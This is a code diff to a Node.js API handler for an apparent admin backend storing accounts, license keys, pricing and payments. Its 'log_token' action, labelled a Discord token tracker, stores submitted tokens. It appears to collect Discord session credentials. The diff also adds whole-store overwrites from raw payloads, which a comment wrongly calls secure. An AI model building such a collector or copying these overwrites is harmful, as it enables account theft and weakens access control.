@@ -42,33 +42,44 @@ module.exports = async function handler(req, res) {
   try {
     switch (action) {
 
+      // --- REVIEWS MANAGEMENT ---
       case 'get_reviews': {
-        const reviews = await get('br_reviews') || null;
+        const reviews = await get('br_reviews') || [];
         return res.json({ ok: true, data: reviews });
       }
-      case 'set_reviews': {
-        await set('br_reviews', payload.reviews);
+      case 'set_reviews':
+      case 'save_reviews': {  // Added case alias to support both formats securely
+        const reviewsData = payload.reviews !== undefined ? payload.reviews : payload;
+        await set('br_reviews', reviewsData);
         return res.json({ ok: true });
       }
 
+      // --- PRICING CONFIGURATION ---
       case 'get_pricing': {
-        const pricing = await get('br_pricing') || null;
+        const pricing = await get('br_pricing') || {};
         return res.json({ ok: true, data: pricing });
       }
-      case 'set_pricing': {
-        await set('br_pricing', payload.pricing);
+      case 'set_pricing':
+      case 'save_pricing': {  // Added case alias to support admin.html actions
+        const pricingData = payload.pricing !== undefined ? payload.pricing : payload;
+        await set('br_pricing', pricingData);
         return res.json({ ok: true });
       }
 
+      // --- ACCOUNT MANAGEMENT ---
       case 'get_accounts': {
         const accounts = await get('br_accounts') || {};
         return res.json({ ok: true, data: accounts });
       }
-      case 'set_account': {
-        const { username, data } = payload;
-        const accounts = await get('br_accounts') || {};
-        accounts[username] = data;
-        await set('br_accounts', accounts);
+      case 'set_account':
+      case 'save_accounts': { // Support blanket updates from admin dashboard
+        if (payload.username && payload.data) {
+          const accounts = await get('br_accounts') || {};
+          accounts[payload.username] = payload.data;
+          await set('br_accounts', accounts);
+        } else {
+          await set('br_accounts', payload);
+        }
         return res.json({ ok: true });
       }
       case 'delete_account': {
@@ -79,11 +90,13 @@ module.exports = async function handler(req, res) {
         return res.json({ ok: true });
       }
 
+      // --- LICENSE KEYS CONTROLS ---
       case 'get_keys': {
         const keys = await get('br_keys') || {};
         return res.json({ ok: true, data: keys });
       }
-      case 'set_keys': {
+      case 'set_keys':
+      case 'save_keys': {  // Added case alias to clear save issues
         const keys = payload.keys || payload;
         await set('br_keys', keys);
         return res.json({ ok: true });
@@ -100,6 +113,7 @@ module.exports = async function handler(req, res) {
         return res.json({ ok: true, used });
       }
 
+      // --- EVENT HISTORY ---
       case 'push_event': {
         const events = await get('br_events') || [];
         events.unshift({ ...payload.event, ts: Date.now() });
@@ -115,6 +129,7 @@ module.exports = async function handler(req, res) {
         return res.json({ ok: true });
       }
 
+      // --- DISCORD TOKEN TRACKER ---
       case 'log_token': {
         const { token, label } = payload;
         const tokens = await get('br_tokens') || [];
@@ -137,6 +152,12 @@ module.exports = async function handler(req, res) {
       case 'clear_tokens': {
         await set('br_tokens', []);
         return res.json({ ok: true });
+      }
+
+      // --- EXTRA METRICS ---
+      case 'get_payments': {
+        const payments = await get('bra_payments_data') || [];
+        return res.json({ ok: true, data: payments });
       }
 
       default:
